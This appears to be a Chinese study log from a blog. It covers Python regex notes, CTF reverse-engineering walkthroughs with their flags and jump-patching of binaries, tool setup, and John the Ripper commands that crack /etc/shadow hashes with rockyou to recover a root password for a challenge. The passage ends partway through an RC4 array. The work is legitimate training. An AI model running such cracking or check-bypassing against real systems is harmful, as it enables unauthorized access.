<th>类别</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>re.I </code></td>
<td>忽略大小写</td>
</tr>
<tr>
<td><code>re.L</code></td>
<td>表示特殊字符集 <code>\w</code>, <code>\W</code>, <code>\b</code>, <code>\B</code>, <code>\s</code>, <code>\S</code> 依赖于当前环境</td>
</tr>
<tr>
<td><code>re.M</code></td>
<td>多行模式</td>
</tr>
<tr>
<td><code>re.S</code></td>
<td>即为 <code>.</code> 并且包括换行符在内的任意字符（<code>.</code> 不包括换行符）</td>
</tr>
<tr>
<td><code>re.U</code></td>
<td>表示特殊字符集 <code>\w</code>, <code>\W</code>, <code>\b</code>, <code>\B</code>, <code>\d</code>, <code>\D</code>, <code>\s</code>, <code>\S</code> 依赖于 Unicode 字符属性数据库</td>
</tr>
<tr>
<td><code>re.X</code></td>
<td>为了增加可读性，忽略<code>空格</code>和 <code>#</code> 后面的注释</td>
</tr>
</tbody></table>
<h3 id="re-search-patten-string-flags-x3D-0"><a href="#re-search-patten-string-flags-x3D-0" class="headerlink" title="re.search(patten, string, flags &#x3D; 0)"></a>re.search(patten, string, flags &#x3D; 0)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.search(<span class="string">&#x27;ll&#x27;</span>, s))</span><br><span class="line"><span class="comment"># &lt;re.Match object; span=(2, 4), match=&#x27;ll&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="re-match-pattern-string-flags-x3D-0"><a href="#re-match-pattern-string-flags-x3D-0" class="headerlink" title="re.match(pattern,string,flags&#x3D;0)"></a>re.match(pattern,string,flags&#x3D;0)</h3><ul>
<li><p>与re.search()的区别在于：</p>
<ul>
<li>re.match()是从起始位置就匹配成功，否则返回none;</li>
<li>re.search()匹配整个字符串，直到找到一个匹配成功的。注意：一次匹配，如果后面还有匹配的也不会查找了.</li>
</ul>
</li>
<li><p>提取数据：group</p>
<ul>
<li>group()用来提取分组截获的字符串，（）用来分组。</li>
<li>group() 同group（0）用来表示匹配正则表达式整体结果。</li>
<li>group(1) 列出第一个括号匹配部分，group(2) 列出第二个括号匹配部分</li>
<li>group(3) 列出第三个括号匹配部分。</li>
<li>当嵌套分组时（有两层括号），即<code>r&#39;((expression1)(expression2))&#39;</code>的情况时，最外层的分组被解释成一个整体group(1)，里层的分组解释从group(2)开始</li>
<li>没有匹配成功的，re.search()返回None。</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.<span class="keyword">match</span>(<span class="string">&#x27;he&#x27;</span>, s))</span><br><span class="line"><span class="comment"># &lt;re.Match object; span=(0, 2), match=&#x27;he&#x27;&gt;</span></span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.<span class="keyword">match</span>(<span class="string">&#x27;hl&#x27;</span>, s))</span><br><span class="line"><span class="comment"># None</span></span><br></pre></td></tr></table></figure>

<p>除非首字符串符合，否则直接返回<code>None</code></p>
<p>从一个字符串的开始位置起匹配正则表达式返回match对象。</p>
<p><strong>常用方法：</strong></p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>group()</td>
<td>用于获得一个或多个分组匹配的字符串，当要获得整个匹配的子串时，可直接使用 group() 或 group(0)</td>
</tr>
<tr>
<td>span()</td>
<td>返回匹配字符串的起始位置</td>
</tr>
<tr>
<td>start()</td>
<td>用于获取分组匹配的子串在整个字符串中的起始位置（子串第一个字符的索引），参数默认值为 0</td>
</tr>
<tr>
<td>end()</td>
<td>用于获取分组匹配的子串在整个字符串中的结束位置（子串最后一个字符的索引+1），参数默认值为 0</td>
</tr>
</tbody></table>
<h3 id="re-findall-pattern-string-flags-x3D-0"><a href="#re-findall-pattern-string-flags-x3D-0" class="headerlink" title="re.findall(pattern,string,flags&#x3D;0)"></a>re.findall(pattern,string,flags&#x3D;0)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s = <span class="string">&#x27;hello_world_123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, s))</span><br><span class="line"><span class="comment"># [&#x27;he&#x27;, &#x27;ll&#x27;, &#x27;o_&#x27;, &#x27;wo&#x27;, &#x27;rl&#x27;, &#x27;d_&#x27;, &#x27;12&#x27;]</span></span><br></pre></td></tr></table></figure>

<p>可按字符数量进行分离，输出为列表形式，不满的直接舍去。</p>
<p>搜索字符串，以列表类型返回全部能匹配的子串</p>
<h3 id="re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0"><a href="#re-split-pattern-string-maxsplit-x3D-0-flags-x3D-0" class="headerlink" title="re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)"></a>re.split(pattern,string,maxsplit&#x3D;0,flags&#x3D;0)</h3><h2 id="正则表达式中的符号"><a href="#正则表达式中的符号" class="headerlink" title="正则表达式中的符号"></a>正则表达式中的符号</h2><h3 id="正则字符"><a href="#正则字符" class="headerlink" title="正则字符"></a>正则字符</h3><table>
<thead>
<tr>
<th>正则符号</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>\</code></td>
<td>转义字符。例如， ‘n’ 匹配字符 ‘n’。</td>
<td></td>
</tr>
<tr>
<td><code>（）</code></td>
<td>标记一个子表达式的开始和结束位置。</td>
<td><code>\( \)</code></td>
</tr>
<tr>
<td><code>.</code></td>
<td>匹配换行符<code>\n</code>之外的任何单字符</td>
<td><code>\.</code></td>
</tr>
<tr>
<td>&#96;</td>
<td>&#96;</td>
<td>&#96;</td>
</tr>
<tr>
<td><code>\d</code></td>
<td>匹配字符串中的单个数字</td>
<td>等价于[0-9]</td>
</tr>
<tr>
<td><code>\D</code></td>
<td>匹配非数字，即不是数字</td>
<td></td>
</tr>
<tr>
<td><code>a-zA-Z</code></td>
<td>匹配全部英文字符</td>
<td></td>
</tr>
<tr>
<td>0-9</td>
<td>匹配全部数字</td>
<td></td>
</tr>
<tr>
<td><code>\w</code></td>
<td>单词字符</td>
<td>等价于[A-Za-z0-9]</td>
</tr>
<tr>
<td><code>\W</code></td>
<td>匹配非单词字符</td>
<td></td>
</tr>
<tr>
<td><code>\s</code></td>
<td>匹配字符串中的<code>\n</code>, <code>\t</code>, <code> 空格</code></td>
<td></td>
</tr>
<tr>
<td><code>\S</code></td>
<td>匹配非空白字符</td>
<td></td>
</tr>
<tr>
<td><code>[]</code></td>
<td>中括号内任意正则符号均可参与匹配</td>
<td><code>[abc]</code>表示a、b、c，<code>[a-z]</code>表示a到z的单个字符</td>
</tr>
<tr>
<td><code>[^]</code></td>
<td>当在方括号表达式中使用，^对其后的正则表达式进行了反义表达</td>
<td><code>[^abc]</code>表示非a或非b或非c的单个字符</td>
</tr>
</tbody></table>
<h3 id="限定字符"><a href="#限定字符" class="headerlink" title="限定字符"></a>限定字符</h3><table>
<thead>
<tr>
<th>正则符号</th>
<th>描述</th>
<th>匹配自己时</th>
</tr>
</thead>
<tbody><tr>
<td><code>*</code></td>
<td>匹配前面的子表达式0次或多次</td>
<td><code>abc*</code>表示<code>ab</code>, <code>abc</code>, <code>abcc</code>……</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配前面的子表达式0次或1次</td>
<td><code>abc?</code>表示<code>ab</code>, <code>abc</code></td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前面的子表达式1次或多次</td>
<td><code>abc+</code>表示<code>abc</code>, <code>abcc</code>, <code>abccc</code>……</td>
</tr>
<tr>
<td><code>&#123;m&#125;</code></td>
<td>m是一个非负整数，匹配确定的m次</td>
<td><code>ab&#123;2&#125;c</code>表示<code>abbc</code></td>
</tr>
<tr>
<td><code>&#123;m,&#125;</code></td>
<td>m是一个非负整数，至少匹配m次</td>
<td></td>
</tr>
<tr>
<td><code>&#123;m, n&#125;</code></td>
<td>m和n均为非负整数，其中$m\le n$，扩展前一个字符m至n次</td>
<td><code>ab&#123;1, 2&#125;c</code>表示<code>abc</code>, <code>abbc</code></td>
</tr>
</tbody></table>
<h3 id="定位字符"><a href="#定位字符" class="headerlink" title="定位字符"></a>定位字符</h3><table>
<thead>
<tr>
<th>正则符号</th>
<th>描述</th>
<th>匹配自己时</th>
</tr>
</thead>
<tbody><tr>
<td><code>^</code></td>
<td>匹配输入字符串的开始位置</td>
<td><code>\^</code></td>
</tr>
<tr>
<td><code>$</code></td>
<td>匹配输入字符串的结尾位置</td>
<td><code>\$</code></td>
</tr>
<tr>
<td><code>\b</code></td>
<td>匹配一个单词边界，即字与空格间的位置</td>
<td></td>
</tr>
<tr>
<td><code>\B</code></td>
<td>非单词边界匹配</td>
<td></td>
</tr>
</tbody></table>
<h3 id="经典案例"><a href="#经典案例" class="headerlink" title="经典案例"></a>经典案例</h3><table>
<thead>
<tr>
<th>正则符号</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>^[A-Za-z]+$</code></td>
<td>由26个字母组成的字符串</td>
</tr>
<tr>
<td><code>^[A-Za-z0-9]+$</code></td>
<td>由26个字母和数字组成的字符串</td>
</tr>
<tr>
<td><code>^-?\d+$</code></td>
<td>整数形式的字符串</td>
</tr>
<tr>
<td><code>^[1-9]*[0-9]*</code></td>
<td>正整数形式的字符串</td>
</tr>
<tr>
<td><code>[1-9]\d&#123;5&#125;</code></td>
<td>中国境内邮政编码，6位</td>
</tr>
<tr>
<td><code>[\u4e00-\u9fa5]</code></td>
<td>匹配中文字符</td>
</tr>
<tr>
<td>&#96;\d{3}-\d{8}</td>
<td>\d{4}-\d{7}&#96;</td>
</tr>
</tbody></table>
<h1 id="230301"><a href="#230301" class="headerlink" title="230301"></a>230301</h1><blockquote>
<p>2-8 明码比较</p>
<p>9-16爆破</p>
<p>17-18内存分析</p>
<p>19-20逻辑分析</p>
</blockquote>
<h2 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF++ 2"></a>CTF++ 2</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>前面的操作步骤跟Test_A2类似。（看<strong>0214</strong>的具体步骤）</p>
<p>经过分析，可溯源看到一些16进制字符串：</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301135636009.png" class="" title="image-20230301135636009">

<p>理论上直接把上边的字符串按<code>A</code>直接转换也可以得到相应的flag，但随时练习一下用代码处理这些字符串吧~</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">list0 = [<span class="string">&#x27;3100360061007B00670061006C0066&#x27;</span>, <span class="string">&#x27;300034003400650031006300350034&#x27;</span>, <span class="string">&#x27;360038006300300033006400390065&#x27;</span>, <span class="string">&#x27;610037003000610033003500630031&#x27;</span>, <span class="string">&#x27;65006400360066&#x27;</span>, <span class="string">&#x27;7D0066&#x27;</span>]</span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list0:</span><br><span class="line">    output.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, i)[::-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># print(output)</span></span><br><span class="line"><span class="comment"># [[&#x27;66&#x27;, &#x27;00&#x27;, &#x27;6C&#x27;, &#x27;00&#x27;, &#x27;61&#x27;, &#x27;00&#x27;, &#x27;67&#x27;, &#x27;00&#x27;, &#x27;7B&#x27;, &#x27;00&#x27;, &#x27;61&#x27;, &#x27;00&#x27;, &#x27;36&#x27;, &#x27;00&#x27;, &#x27;31&#x27;], [&#x27;34&#x27;, &#x27;00&#x27;, &#x27;35&#x27;, &#x27;00&#x27;, &#x27;63&#x27;, &#x27;00&#x27;, &#x27;31&#x27;, &#x27;00&#x27;, &#x27;65&#x27;, &#x27;00&#x27;, &#x27;34&#x27;, &#x27;00&#x27;, &#x27;34&#x27;, &#x27;00&#x27;, &#x27;30&#x27;], [&#x27;65&#x27;, &#x27;00&#x27;, &#x27;39&#x27;, &#x27;00&#x27;, &#x27;64&#x27;, &#x27;00&#x27;, &#x27;33&#x27;, &#x27;00&#x27;, &#x27;30&#x27;, &#x27;00&#x27;, &#x27;63&#x27;, &#x27;00&#x27;, &#x27;38&#x27;, &#x27;00&#x27;, &#x27;36&#x27;], [&#x27;31&#x27;, &#x27;00&#x27;, &#x27;63&#x27;, &#x27;00&#x27;, &#x27;35&#x27;, &#x27;00&#x27;, &#x27;33&#x27;, &#x27;00&#x27;, &#x27;61&#x27;, &#x27;00&#x27;, &#x27;30&#x27;, &#x27;00&#x27;, &#x27;37&#x27;, &#x27;00&#x27;, &#x27;61&#x27;], [&#x27;66&#x27;, &#x27;00&#x27;, &#x27;36&#x27;, &#x27;00&#x27;, &#x27;64&#x27;, &#x27;00&#x27;, &#x27;65&#x27;], [&#x27;66&#x27;, &#x27;00&#x27;, &#x27;7D&#x27;]]</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> output:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(i)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(i[j], <span class="number">16</span>) != <span class="number">0</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i[j], <span class="number">16</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;a6145c1e440e9d30c861c53a07af6def&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="CTF-3"><a href="#CTF-3" class="headerlink" title="CTF++ 3"></a>CTF++ 3</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>emm，直接看<code>string</code>界面就行了。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301142900007.png" class="" title="image-20230301142900007">

<h2 id="CTF-4"><a href="#CTF-4" class="headerlink" title="CTF++ 4"></a>CTF++ 4</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>顺着流程图结合汇编语言大概分析一下，比较关键的地方就是下面红框所示，看下两个红框进行了比较处理等，说明是关键数据，直接到对应地方查看数据，然后将这些数据使用代码处理一下，得到相应的flag。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301143630663.png" class="" title="image-20230301143630663">

<p>跳转到关键数据处。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301143505329.png" class="">

<p>代码如<code>CTF++ 3</code>所示。</p>
<h2 id="CTF-5"><a href="#CTF-5" class="headerlink" title="CTF++ 5"></a>CTF++ 5</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>？？？</p>
<p><em>好像确实flag没变。</em></p>
<h2 id="CTF-6"><a href="#CTF-6" class="headerlink" title="CTF++ 6"></a>CTF++ 6</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>前面步骤跟TEST_A类似。</p>
<p>中间跳转到调用函数的汇编语言处，会发现是红色的，所以上溯到函数入口，然后<code>create function</code>，再重新去对应地方，根据判断条件找到对应参数，然后跳转到对应参数去。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301144853602.png" class="" title="判断参数">

<p>再进行跳转。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230301145017968.png" class="" title="跳转参数">

<p>最后就直接到flag的地方了。</p>
<h2 id="CTF-7"><a href="#CTF-7" class="headerlink" title="CTF++ 7"></a>CTF++ 7</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>emm，直接函数跳转就到了。</p>
<h2 id="CTF-8"><a href="#CTF-8" class="headerlink" title="CTF++ 8"></a>CTF++ 8</h2><blockquote>
<p>flag{a6145c1e440e9d30c861c53a07af6def}</p>
</blockquote>
<p>跟6类似，一路跳转找到对应的参数即可。</p>
<p><em>脑子有点糊，不想搞，摸鱼了。</em></p>
<h1 id="230302"><a href="#230302" class="headerlink" title="230302"></a>230302</h1><p><em>github-token</em></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>Str：What_should_I_do</p>
<p>b3596e322275cb5e59a9a9f50a274715</p>
<p><em>果不其然错了，但觉得定位到key part了。</em></p>
<h1 id="230303"><a href="#230303" class="headerlink" title="230303"></a>230303</h1><blockquote>
<p><a href="https://blog.csdn.net/xiao__1bai/article/details/120891156">(10条消息) CTF逆向总结（二）_沐一 · 林的博客-CSDN博客</a></p>
</blockquote>
<h2 id="9-1"><a href="#9-1" class="headerlink" title="9"></a>9</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<h3 id="关于修改汇编代码或者跳转逻辑"><a href="#关于修改汇编代码或者跳转逻辑" class="headerlink" title="关于修改汇编代码或者跳转逻辑"></a>关于修改汇编代码或者跳转逻辑</h3><ul>
<li>直接选定对应的汇编代码，然后选择<code>Edit</code> -&gt; <code>Patch Program</code> -&gt; <code>Assemble</code>，修改对应的汇编代码，如下图，<code>jnz -&gt; jz</code>。</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230303130402709.png" class="" title="image-20230303130402709">

<ul>
<li>也可以到<code>hex</code>界面，修改对应的机器码，如<code>jnz</code>对应的机器码为<code>75</code>，然后修改机器码为<code>74</code>，即<code>jz</code>。</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230303130836473.png" class="" title="image-20230303130836473">

<ul>
<li><p>剩下步骤，如<strong>0206</strong> <a href="0206-0210.md">0206-0210.md</a> 所示。</p>
</li>
<li><p>生成新的执行文件后，就可以改变原有的跳转逻辑，即使输出错误也可以直接得到相应的flag了。</p>
</li>
</ul>
<h2 id="Test-B"><a href="#Test-B" class="headerlink" title="Test_B"></a>Test_B</h2><p>两条路：</p>
<ul>
<li>修改跳转逻辑</li>
<li>分析原始代码，直接爆破相关数据</li>
</ul>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>逻辑一致了，直接把原本的判断条件以及跳转逻辑修改一下即可。</p>
<p>原本的判断条件是<code>jz</code>，并且运行之后是往错误的方向跳转，那我们直接修改一下当前的一个跳转逻辑即可成功运行到我们期望的正确路线运行。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230303144321661.png" class="" title="image-20230303144321661">

<p>但这边分析也存在一点问题，原本在<code>debug</code>分析中能看到当前的数据，但<code>release</code>之后，无法看到当前的数据，如果打算走分析爆破的路线的话，这部分可能存在一点没注意到的地方。</p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>思路同上，比较麻烦的一点是，难以跳转到验证条件的流程图。</p>
<h3 id="定位的思路"><a href="#定位的思路" class="headerlink" title="定位的思路"></a>定位的思路</h3><ul>
<li>先查看<code>string</code>界面，然后找到关键字符串<code>you are right</code>etc.</li>
<li>跳转进入之后，找到该字符串对应的关键函数<code>aYouAreRighthHah</code></li>
<li>定位到关键函数之后，直接按<code>x</code>查看交叉使用的地方</li>
<li>最终定位到流程图的调用界面了</li>
<li>再按需求进行相应地修改并应用</li>
</ul>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><blockquote>
<p>flag{0272995b2b6bbc4915f717c2562e8b39}</p>
</blockquote>
<p>跟10类似。</p>
<h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>整体逻辑跟上面是类似的，经过窗口输入，发现输入错误直接跳转到了<code>错误</code>字段，那么我们同样把判断逻辑改变一下，直接跳转到给出flag部分，就可以直接得到flag了。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230303162147833.png" class="" title="image-20230303162147833">

<p>不行，心梗得难受，空了把C语言中涉及到RC4的加解密逻辑理顺一遍，</p>
<img src="/2023/12/31/WeeklyStudy/image-20230303161828684.png" class="" title="image-20230303161828684">

<h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>类似，关键还是得定位判定条件所处的位置。</p>
<h1 id="230306"><a href="#230306" class="headerlink" title="230306"></a>230306</h1><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>利用函数跳转到判定条件，修改重生成即可。</p>
<h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><blockquote>
<p>flag{d12a276452f92bd97535e69eae699541}</p>
</blockquote>
<p>同上，定位判定的汇编语句。</p>
<h2 id="kali安装vol"><a href="#kali安装vol" class="headerlink" title="kali安装vol"></a>kali安装vol</h2><p>中间出现一点问题：</p>
<ul>
<li>管理员模式以及当前模式下的pip2指向的路径不一样</li>
<li>construct模块一直安装不成功</li>
</ul>
<p>当前解决：</p>
<ul>
<li>直接干脆全用管理员模式的pip2进行相关安装库操作</li>
<li><code>setuptools</code>没安装&#x2F;没更新</li>
</ul>
<h2 id="gnuplot"><a href="#gnuplot" class="headerlink" title="gnuplot"></a>gnuplot</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><code>sudo apt-get install gnuplot</code></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ul>
<li>txt文件，内含坐标</li>
<li>进入目录，运行<code>gnuplot</code></li>
<li>后运行<code>plot&#39;xxx.txt&#39;</code></li>
</ul>
<p><em>但为啥导出的图片放到win7直接成一半了呢。</em></p>
<h1 id="230307"><a href="#230307" class="headerlink" title="230307"></a>230307</h1><h2 id="kali爆破Linux密码"><a href="#kali爆破Linux密码" class="headerlink" title="kali爆破Linux密码"></a>kali爆破Linux密码</h2><blockquote>
<p><a href="https://blog.csdn.net/qq_41608408/article/details/129253383">(10条消息) Kali 爆破 Linux 密码 | 使用 John the Ripper 爆破 etc&#x2F;shadow 文件 | 报错： UTF-8 No password hashes loaded_kali 爆破目录_学习溢出的博客-CSDN博客</a></p>
</blockquote>
<p><strong>题目：</strong></p>
<blockquote>
<p><a href="https://w3challs.com/challenges/crypto/shadow">Crypto: Shadow – W3Challs Hacking Challenges</a></p>
</blockquote>
<p><strong>解答：</strong></p>
<ul>
<li>把需要爆破的放到一个文件</li>
<li>直接使用<code>join</code>进行爆破，<code>sudo john /home/kali/Desktop/CRYPTO/task --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt</code></li>
<li>最后得到<code>root</code>的密码</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230307095910729.png" class="" title="image-20230307095910729">

<h2 id="join的新使用"><a href="#join的新使用" class="headerlink" title="join的新使用"></a>join的新使用</h2><p>因为从 Debian 11 &#x2F; bullseye 系统 （适用于Kali）开始， 默认的密码哈希函数使用 yescrypt 。<br>因此之前 John the Ripper 的命令将<strong>无法再运行</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo john [/etc/shadow] --<span class="built_in">format</span>=crypt</span><br><span class="line">sudo john [/etc/shadow] --<span class="built_in">format</span>=crypt --wordlist=/usr/share/john/password.lst</span><br><span class="line">sudo john [/etc/shadow] --<span class="built_in">format</span>=crypt --wordlist=[../]rockyou.txt</span><br></pre></td></tr></table></figure>

<p>在找到密码后，如果不小心关掉窗口了可以使用 <code>--show</code> 来再次显示已经爆破的密码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudo john [/etc/shadow] --show</span><br></pre></td></tr></table></figure>



<h2 id="F5算法环境修改"><a href="#F5算法环境修改" class="headerlink" title="F5算法环境修改"></a>F5算法环境修改</h2><blockquote>
<p><a href="https://blog.csdn.net/pythllc/article/details/128969843">(10条消息) 安装F5-steganography和使用，及解决java环境版本报错问题_墨笙故君的博客-CSDN博客</a></p>
</blockquote>
<h3 id="Java指定版本下载"><a href="#Java指定版本下载" class="headerlink" title="Java指定版本下载"></a>Java指定版本下载</h3><blockquote>
<p><a href="https://www.oracle.com/java/technologies/downloads/#java11%EF%BC%8C%E4%B8%8B%E8%BD%BDjava11.0.18%E7%9A%84%E5%8E%8B%E7%BC%A9%E5%8C%85">https://www.oracle.com/java/technologies/downloads/#java11，下载java11.0.18的压缩包</a></p>
</blockquote>
<h3 id="移动到指定路径并切换进行解压缩"><a href="#移动到指定路径并切换进行解压缩" class="headerlink" title="移动到指定路径并切换进行解压缩"></a>移动到指定路径并切换进行解压缩</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mv jdk-<span class="number">11.0</span><span class="number">.18</span>_linux-x64_bin.tar.gz /etc/opt</span><br><span class="line">cd /etc/opt</span><br><span class="line">tar -zxvf jdk-<span class="number">11.0</span><span class="number">.18</span>_linux-x64_bin.tar.gz</span><br></pre></td></tr></table></figure>

<h3 id="拷贝解压后的Java文件至指定路径"><a href="#拷贝解压后的Java文件至指定路径" class="headerlink" title="拷贝解压后的Java文件至指定路径"></a>拷贝解压后的Java文件至指定路径</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cp -r jdk-<span class="number">11.0</span><span class="number">.18</span>/ /usr/<span class="built_in">bin</span></span><br></pre></td></tr></table></figure>

<h3 id="安装并进行注册"><a href="#安装并进行注册" class="headerlink" title="安装并进行注册"></a>安装并进行注册</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update-alternatives --install /usr/<span class="built_in">bin</span>/java java /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/java <span class="number">1</span></span><br><span class="line">update-alternatives --install /usr/<span class="built_in">bin</span>/javac javac /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/javac <span class="number">1</span></span><br><span class="line">update-alternatives --<span class="built_in">set</span> java /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/java</span><br><span class="line">update-alternatives --<span class="built_in">set</span> javac /etc/opt/jdk-<span class="number">11.0</span><span class="number">.18</span>/<span class="built_in">bin</span>/javac</span><br></pre></td></tr></table></figure>

<p><em>中间出现手动模式，好像不太影响整体的安装注册</em></p>
<h3 id="查看切换后的Java版本"><a href="#查看切换后的Java版本" class="headerlink" title="查看切换后的Java版本"></a>查看切换后的Java版本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">java --version</span><br></pre></td></tr></table></figure>

<p>注册了<code>Oracle</code>，<code>no \</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230307105656163.png" class="" title="image-20230307105656163">

<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><p>最后再运行一下<code>F5</code>，输出为<code>output.txt</code></p>
<img src="/2023/12/31/WeeklyStudy/image-20230307105825810.png" class="" title="image-20230307105825810">

<h2 id="！图像相关"><a href="#！图像相关" class="headerlink" title="！图像相关"></a>！图像相关</h2><blockquote>
<p><a href="https://lazzzaro.github.io/2020/05/06/misc-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/">https://lazzzaro.github.io/2020/05/06/misc-%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/</a></p>
</blockquote>
<h2 id="！网安练习平台"><a href="#！网安练习平台" class="headerlink" title="！网安练习平台"></a>！网安练习平台</h2><blockquote>
<p><a href="https://blog.csdn.net/shuteer_xu/article/details/128213019">(10条消息) 国内外优秀网安练习平台_Ms08067安全实验室的博客-CSDN博客</a></p>
</blockquote>
<h2 id="！Hydra"><a href="#！Hydra" class="headerlink" title="！Hydra"></a>！Hydra</h2><blockquote>
<p><a href="https://www.cnblogs.com/mchina/archive/2013/01/01/2840815.html">Linux下暴力破解工具Hydra详解 - Merlin_Tang - 博客园 (cnblogs.com)</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230307152419257.png" class="" title="image-20230307152419257">

<h2 id="RC4，C语言代码分析以及python实现"><a href="#RC4，C语言代码分析以及python实现" class="headerlink" title="RC4，C语言代码分析以及python实现"></a>RC4，C语言代码分析以及python实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> gszFlag[<span class="number">40</span>] = &#123;&#125;;</span><br><span class="line"><span class="type">char</span> cmpFlag[<span class="number">256</span>] = &#123; <span class="number">0x70</span>,<span class="number">0x5f</span>,<span class="number">0xbf</span>,<span class="number">0x8f</span>,<span class="number">0x71</span>,<span class="number">0x9c</span>,<span class="number">0xe4</span>,<span class="number">0xf0</span>,<span class="number">0x4b</span>,<span class="number">0x50</span>,<span class="number">0x70</span>,<span class="number">0x4f</span>,<span class="number">0x7e</span>,<span class="number">0x85</span>,<span class="number">0xd8</span>,<span class="number">0x7b</span>,<span class="number">0x9e</span>,<span class="number">0x5b</span>,<span class="number">0xe1</span>,<span class="number">0x60</span>,<span class="number">0x04</span>,<span class="number">0xf0</span>,<span class="number">0xee</span>,<span class="number">0x8b</span>,<span class="number">0x08</span>,<span class="number">0x1a</span>,<span class="number">0xfb</span>,<span class="number">0x69</span>,<span class="number">0x60</span>,<span class="number">0x2f</span>,<span class="number">0x4e</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x92</span>,<span class="number">0x4d</span>,<span class="number">0xda</span>,<span 